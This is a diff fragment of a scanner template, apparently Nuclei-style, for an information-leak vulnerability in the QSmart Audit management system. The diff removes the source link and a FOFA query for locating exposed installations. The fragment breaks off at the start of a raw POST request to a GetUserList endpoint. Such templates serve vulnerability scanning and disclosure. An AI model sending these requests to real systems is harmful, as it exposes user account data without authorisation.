@@ -3,12 +3,8 @@ info:
   name: QSmart Audit 管理系统存在敏感信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cgnark1zo27xa2s4'
+  description: ''
   tags: info-leak,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cgnark1zo27xa2s4
-    fofa: title="QSmart Audit管理系统V3.0"
 http:
 - raw:
   - 'POST /service/SystemManageHandler.ashx?action=GetUserList HTTP/1.1
